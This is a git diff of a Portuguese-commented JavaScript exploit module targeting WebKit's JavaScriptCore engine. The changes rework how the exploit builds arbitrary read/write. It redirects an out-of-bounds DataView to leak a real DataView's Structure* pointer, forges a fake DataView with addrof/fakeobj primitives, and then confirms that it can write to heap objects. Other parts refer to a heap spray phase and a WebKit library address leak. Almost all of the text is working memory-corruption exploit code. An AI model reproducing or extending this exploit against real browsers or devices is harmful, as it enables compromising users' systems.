@@ -16,7 +16,9 @@ import {
     initCoreAddrofFakeobjPrimitives, // Importar função de inicialização
     arb_read,                // Importar arb_read direto do core_exploit (esta é a "old_arb_read")
     arb_write,               // Importar arb_write direto do core_exploit (esta é a "old_arb_write")
-    selfTestOOBReadWrite     // Importar selfTestOOBReadWrite
+    selfTestOOBReadWrite,    // Importar selfTestOOBReadWrite
+    oob_read_absolute,       // Importar oob_read_absolute para uso no vazamento da Structure*
+    oob_write_absolute       // Importar oob_write_absolute para uso no vazamento da Structure*
 } from '../core_exploit.mjs';
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
@@ -48,25 +50,56 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
     const FNAME = "setupUniversalArbitraryReadWrite";
     logFn(`[${FNAME}] Iniciando configuração da primitiva de L/E Arbitrária Universal via fake DataView...`, "subtest", FNAME);
 
+    // Variáveis para armazenar snapshots de metadados do DataView OOB para restauração
+    let m_vector_orig_snap_oob, m_length_orig_snap_oob, m_mode_orig_snap_oob;
+    let success = false; // Flag para controlar o fluxo de saída
+
     try {
-        // --- NOVO: Vazar a Structure* de um DataView real para usar no fakeobj ---
+        // --- Vazar a Structure* de um DataView real usando a primitiva OOB original ---
         const real_data_view_for_leak = new DataView(new ArrayBuffer(16)); // Crie um DataView real
         const real_data_view_addr = addrof_core(real_data_view_for_leak); // Obtenha o endereço do DataView real
         logFn(`[${FNAME}] Endereço do DataView real para vazamento de Structure*: ${real_data_view_addr.toString(true)}`, "leak", FNAME);
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // Leia o ponteiro da Structure* no offset 0x8 do DataView real (JSCell.STRUCTURE_POINTER_OFFSET)
-        const real_data_view_structure_ptr_addr = real_data_view_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
-        const REAL_DATA_VIEW_STRUCTURE_PTR = await arb_read_universal_js_heap(real_data_view_structure_ptr_addr, 8, logFn);
+        // Precisamos usar a primitiva OOB base (oob_read_absolute/oob_write_absolute)
+        // para manipular o nosso oob_dataview_real e apontá-lo para real_data_view_addr
+        // para ler a Structure*.
 
-        if (!isAdvancedInt64Object(REAL_DATA_VIEW_STRUCTURE_PTR) || REAL_DATA_VIEW_STRUCTURE_PTR.equals(AdvancedInt64.Zero) || REAL_DATA_VIEW_STRUCTURE_PTR.equals(AdvancedInt64.NaNValue)) {
-            logFn(`[${FNAME}] ERRO: Não foi possível vazar o ponteiro da Structure* do DataView real. Vazado: ${REAL_DATA_VIEW_STRUCTURE_PTR ? REAL_DATA_VIEW_STRUCTURE_PTR.toString(true) : 'N/A'}`, "critical", FNAME);
+        // Captura os snapshots originais do oob_dataview_real ANTES da manipulação
+        // Certifique-se que oob_dataview_real esteja pronto aqui.
+        if (!getOOBDataView()) {
+            logFn(`[${FNAME}] ERRO: oob_dataview_real não está pronto para o vazamento de Structure*.`, "critical", FNAME);
             return false;
         }
-        logFn(`[${FNAME}] PONTEIRO DA STRUCTURE* REAL DO DATAVIEW VAZADO: ${REAL_DATA_VIEW_STRUCTURE_PTR.toString(true)}`, "leak", FNAME);
+
+        logFn(`[${FNAME}] DEBUG: Realizando snapshots de metadados do oob_dataview_real antes de vazar Structure*.`, 'debug');
+        // Os offsets 0x58 (OOB_DV_METADATA_BASE_IN_OOB_BUFFER) são assumidos como a base dos metadados do DataView no buffer OOB.
+        // JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET (0x10), M_LENGTH_OFFSET (0x18), M_MODE_OFFSET (0x1C) são offsets dentro da estrutura do DataView.
+        m_vector_orig_snap_oob = oob_read_absolute(0x58 + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET, 8); // Offset 0x10 dentro do oob_dataview_real's metadata
+        m_length_orig_snap_oob = oob_read_absolute(0x58 + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 4); // Offset 0x18
+        m_mode_orig_snap_oob = oob_read_absolute(0x58 + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET, 4); // Offset 0x1C
+        logFn(`[${FNAME}] DEBUG: Snapshots ORIGINAIS do OOB DV: m_vector=${m_vector_orig_snap_oob.toString(true)}, m_length=${toHex(m_length_orig_snap_oob)}, m_mode=${toHex(m_mode_orig_snap_oob)}`, 'debug');
+
+        // Aponta o m_vector do oob_dataview_real para o endereço do DataView real
+        oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET, real_data_view_addr, 8);
+        // Expande o m_length do oob_dataview_real para permitir leitura completa
+        oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
+        logFn(`[${FNAME}] oob_dataview_real m_vector redirecionado para ${real_data_view_addr.toString(true)} para vazamento de Structure*.`, "info", FNAME);
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // --- FIM DO VAZAMENTO DA STRUCTURE* REAL ---
+        // Agora, o oob_dataview_real pode ler o conteúdo do real_data_view_for_leak
+        // A Structure* do DataView real está no offset 0 do DataView (JSCell.STRUCTURE_POINTER_OFFSET)
+        // Lemos diretamente do oob_dataview_real, pois ele está agora "olhando" para o real_data_view_for_leak
+        const REAL_DATA_VIEW_STRUCTURE_PTR = oob_read_absolute(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET, 8);
+
+        if (!isAdvancedInt64Object(REAL_DATA_VIEW_STRUCTURE_PTR) || REAL_DATA_VIEW_STRUCTURE_PTR.equals(AdvancedInt64.Zero) || REAL_DATA_VIEW_STRUCTURE_PTR.equals(AdvancedInt64.NaNValue)) {
+            logFn(`[${FNAME}] ERRO: Não foi possível vazar o ponteiro da Structure* do DataView real usando OOB base. Vazado: ${REAL_DATA_VIEW_STRUCTURE_PTR ? REAL_DATA_VIEW_STRUCTURE_PTR.toString(true) : 'N/A'}`, "critical", FNAME);
+            return false;
+        }
+        logFn(`[${FNAME}] PONTEIRO DA STRUCTURE* REAL DO DATAVIEW VAZADO (via OOB base): ${REAL_DATA_VIEW_STRUCTURE_PTR.toString(true)}`, "leak", FNAME);
+        await pauseFn(LOCAL_SHORT_PAUSE);
+
+        // --- FIM DO VAZAMENTO DA STRUCTURE* REAL USANDO OOB ORIGINAL ---
 
         // 1. Criar um objeto JavaScript simples que servirá como o "corpo" do nosso DataView forjado.
         const fake_dv_backing_object = {
@@ -83,7 +116,7 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
         logFn(`[${FNAME}] Endereço do objeto de apoio para o DataView forjado: ${fake_dv_backing_object_addr.toString(true)}`, "leak", FNAME);
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // 2. Preencher os campos do objeto de apoio na memória usando `arb_write` (a primitiva atual).
+        // 2. Preencher os campos do objeto de apoio na memória usando `arb_write` (a primitiva antiga).
         // AGORA USAMOS O PONTEIRO DA STRUCTURE* REAL QUE VAZAMOS DINAMICAMENTE.
         await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), REAL_DATA_VIEW_STRUCTURE_PTR, 8);
         logFn(`[${FNAME}] Ponteiro da Structure* (${REAL_DATA_VIEW_STRUCTURE_PTR.toString(true)}) plantado no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do objeto de apoio.`, "info", FNAME);
@@ -103,58 +136,67 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
         if (!(_fake_data_view instanceof DataView)) {
             logFn(`[${FNAME}] ERRO CRÍTICO: fakeobj_core não conseguiu criar um DataView forjado válido! Tipo: ${typeof _fake_data_view}`, "critical", FNAME);
             logFn(`[${FNAME}] Isso indica que o Structure* vazado (${REAL_DATA_VIEW_STRUCTURE_PTR.toString(true)}) está incorreto, ou que o layout do objeto forjado não corresponde ao de um DataView.`, "critical", FNAME);
-            return false;
-        }
-        logFn(`[${FNAME}] DataView forjado criado com sucesso: ${_fake_data_view} (typeof: ${typeof _fake_data_view})`, "good", FNAME);
-        await pauseFn(LOCAL_SHORT_PAUSE);
+            success = false; // Garante que a flag de sucesso seja falsa
+        } else {
+            logFn(`[${FNAME}] DataView forjado criado com sucesso: ${_fake_data_view} (typeof: ${typeof _fake_data_view})`, "good", FNAME);
+            await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // 4. Testar a primitiva de leitura/escrita arbitrária universal recém-criada
-        // Vamos testar lendo/escrevendo *em outro objeto JS simples* no heap de objetos JS.
-        const test_target_js_object = { test_prop: 0x11223344, second_prop: 0xAABBCCDD };
-        const test_target_js_object_addr = addrof_core(test_target_js_object);
-        logFn(`[${FNAME}] Testando L/E Universal com _fake_data_view: Alvo é objeto JS em ${test_target_js_object_addr.toString(true)}`, "info", FNAME);
+            // 4. Testar a primitiva de leitura/escrita arbitrária universal recém-criada
+            // Vamos testar lendo/escrevendo *em outro objeto JS simples* no heap de objetos JS.
+            const test_target_js_object = { test_prop: 0x11223344, second_prop: 0xAABBCCDD };
+            const test_target_js_object_addr = addrof_core(test_target_js_object);
+            logFn(`[${FNAME}] Testando L/E Universal com _fake_data_view: Alvo é objeto JS em ${test_target_js_object_addr.toString(true)}`, "info", FNAME);
 
-        // Usar arb_write para re-apontar o m_vector do fake_dv_backing_object
-        // O fake_data_view vai "ver" a memória para onde m_vector aponta
-        await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET), test_target_js_object_addr, 8);
-        logFn(`[${FNAME}] m_vector do DataView forjado redirecionado para ${test_target_js_object_addr.toString(true)}.`, "info", FNAME);
+            // Usar arb_write para re-apontar o m_vector do fake_dv_backing_object
+            // O fake_data_view vai "ver" a memória para onde m_vector aponta
+            await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET), test_target_js_object_addr, 8);
+            logFn(`[${FNAME}] m_vector do DataView forjado redirecionado para ${test_target_js_object_addr.toString(true)}.`, "info", FNAME);
 
-        const TEST_VALUE_UNIVERSAL = 0xDEADC0DE;
-        logFn(`[${FNAME}] Escrevendo ${toHex(TEST_VALUE_UNIVERSAL)} no offset 0 (onde 'test_prop' está) do objeto JS usando _fake_data_view...`, "info", FNAME);
-        try {
-            _fake_data_view.setUint32(0, TEST_VALUE_UNIVERSAL, true);
+            const TEST_VALUE_UNIVERSAL = 0xDEADC0DE;
+            logFn(`[${FNAME}] Escrevendo ${toHex(TEST_VALUE_UNIVERSAL)} no offset 0 (onde 'test_prop' está) do objeto JS usando _fake_data_view...`, "info", FNAME);
+            try {
+                _fake_data_view.setUint32(0, TEST_VALUE_UNIVERSAL, true);
 
-            const read_back_from_fake_dv = _fake_data_view.getUint32(0, true);
-            if (read_back_from_fake_dv === TEST_VALUE_UNIVERSAL) {
-                logFn(`[${FNAME}] SUCESSO CRÍTICO: Leitura/Escrita Universal (dentro do heap de objetos JS) FUNCIONANDO! Lido: ${toHex(read_back_from_fake_dv)}.`, "good", FNAME);
-                logFn(`[${FNAME}] Verificando a propriedade original do objeto JS: test_prop = ${toHex(test_target_js_object.test_prop)}.`, "leak", FNAME);
-                if (test_target_js_object.test_prop === TEST_VALUE_UNIVERSAL) {
-                    logFn(`[${FNAME}] SUCESSO: A escrita via _fake_data_view modificou o objeto JS original. ARB R/W no heap JS CONFIRMADA!`, "vuln", FNAME);
+                const read_back_from_fake_dv = _fake_data_view.getUint32(0, true);
+                if (read_back_from_fake_dv === TEST_VALUE_UNIVERSAL) {
+                    logFn(`[${FNAME}] SUCESSO CRÍTICO: Leitura/Escrita Universal (dentro do heap de objetos JS) FUNCIONANDO! Lido: ${toHex(read_back_from_fake_dv)}.`, "good", FNAME);
+                    logFn(`[${FNAME}] Verificando a propriedade original do objeto JS: test_prop = ${toHex(test_target_js_object.test_prop)}.`, "leak", FNAME);
+                    if (test_target_js_object.test_prop === TEST_VALUE_UNIVERSAL) {
+                        logFn(`[${FNAME}] SUCESSO: A escrita via _fake_data_view modificou o objeto JS original. ARB R/W no heap JS CONFIRMADA!`, "vuln", FNAME);
+                    } else {
+                        logFn(`[${FNAME}] ALERTA: A escrita via _fake_data_view NÃO modificou o objeto JS original como esperado. Inconsistência.`, "warn", FNAME);
+                    }
+                    success = true; // SUCESSO FINAL NESTA FASE
                 } else {
-                    logFn(`[${FNAME}] ALERTA: A escrita via _fake_data_view NÃO modificou o objeto JS original como esperado. Inconsistência.`, "warn", FNAME);
+                    logFn(`[${FNAME}] FALHA: L/E Universal (dentro do heap de objetos JS) INCONSISTENTE! Lido: ${toHex(read_back_from_fake_dv)}, Esperado: ${toHex(TEST_VALUE_UNIVERSAL)}.`, "error", FNAME);
+                    success = false;
                 }
-                return true;
-            } else {
-                logFn(`[${FNAME}] FALHA: L/E Universal (dentro do heap de objetos JS) INCONSISTENTE! Lido: ${toHex(read_back_from_fake_dv)}, Esperado: ${toHex(TEST_VALUE_UNIVERSAL)}.`, "error", FNAME);
+            } catch (e_universal_rw_test) {
+                logFn(`[${FNAME}] ERRO durante teste de L/E Universal com _fake_data_view: ${e_universal_rw_test.message}.`, "critical", FNAME);
+                success = false;
             }
-        } catch (e_universal_rw_test) {
-            logFn(`[${FNAME}] ERRO durante teste de L/E Universal com _fake_data_view: ${e_universal_rw_test.message}.`, "critical", FNAME);
         }
-        return false;
+        return success;
 
     } catch (e) {
         logFn(`ERRO CRÍTICO na configuração da L/E Universal: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
         return false;
     } finally {
-        // SEMPRE resetar o m_vector no final para evitar crashes inesperados, mesmo em caso de erro.
-        // Verifica se fake_dv_backing_object_addr está definido para evitar ReferenceError.
-        if (_fake_data_view && typeof fake_dv_backing_object_addr !== 'undefined') {
+        // Restaurar m_vector do oob_dataview_real PARA SEU VALOR ORIGINAL AQUI
+        // Independentemente do sucesso ou falha da fase.
+        // Verifica se oob_dataview_real e os snapshots estão definidos para evitar erros.
+        if (getOOBDataView() && typeof m_vector_orig_snap_oob !== 'undefined' && typeof m_length_orig_snap_oob !== 'undefined' && typeof m_mode_orig_snap_oob !== 'undefined') {
             try {
-                await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET), AdvancedInt64.Zero, 8);
-                logFn(`[${FNAME}] m_vector do DataView forjado resetado.`, "debug", FNAME);
-            } catch (e_reset) {
-                logFn(`[${FNAME}] ERRO ao resetar m_vector: ${e_reset.message}. Pode causar crash posterior.`, "error", FNAME);
+                // Os offsets 0x58 (OOB_DV_METADATA_BASE_IN_OOB_BUFFER) são a base dos metadados do DataView no buffer OOB.
+                oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET, m_vector_orig_snap_oob, 8);
+                oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET, m_length_orig_snap_oob, 4);
+                oob_write_absolute(0x58 + JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET, m_mode_orig_snap_oob, 4);
+                logFn(`[${FNAME}] DEBUG: Metadados do oob_dataview_real restaurados.`, "debug", FNAME);
+            } catch (e_restore) {
+                logFn(`[${FNAME}] ERRO ao restaurar metadados do oob_dataview_real: ${e_restore.message}. Ambiente pode estar instável.`, "error", FNAME);
             }
+        } else {
+            logFn(`[${FNAME}] ALERTA: Não foi possível restaurar metadados do oob_dataview_real. Ambiente OOB pode estar comprometido ou não inicializado.`, "warn", FNAME);
         }
         logFn(`--- Configuração da L/E Universal Concluída ---`, "test", FNAME);
     }
@@ -170,7 +212,7 @@ export async function arb_read_universal_js_heap(address, byteLength, logFn) {
         throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
     }
     // Redirecionar o m_vector do DataView forjado para o endereço desejado
-    const fake_dv_backing_object_addr = addrof_core(_fake_data_view);
+    const fake_dv_backing_object_addr = addrof_core(_fake_data_view); // Endereço do objeto que serve de corpo para o _fake_data_view
     const M_VECTOR_OFFSET_IN_BACKING_OBJECT = fake_dv_backing_object_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
 
     await arb_write(M_VECTOR_OFFSET_IN_BACKING_OBJECT, address, 8); // Manipula o corpo do fake DataView para apontar para 'address'
@@ -317,6 +359,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         }
         logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Prosseguindo com a exploração.", "good");
         await pauseFn(LOCAL_MEDIUM_PAUSE);
+
 
         // --- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---
         logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---", "subtest");
@@ -495,7 +538,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
         } else {
             logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
-            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessTest_post_leak})`;
+            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak})`;
         }
         logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Time: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");
 
